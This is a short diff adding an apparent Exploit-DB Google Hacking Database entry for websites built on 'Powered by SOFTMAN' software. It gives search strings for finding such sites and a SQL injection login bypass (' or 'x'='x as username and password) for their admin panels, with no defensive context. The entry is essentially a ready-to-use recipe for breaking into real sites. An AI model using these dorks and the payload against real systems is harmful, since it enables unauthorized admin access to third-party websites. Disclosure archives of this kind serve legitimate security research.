@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3693
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-03-07
+Author:           anonymous
+GoogleDork:       "Powered by SOFTMAN"
+Description:      "Powered by SOFTMAN"
+
+
+Author: eXeSoul [i] "Powered by SOFTMAN" [ii] "Powered by Softman Multitech Pvt Ltd" [iii] "All Rights reserved by SOFTMAN" Go To Admin Panel :- Admin: ' or 'x'='x Password: ' or 'x'='x
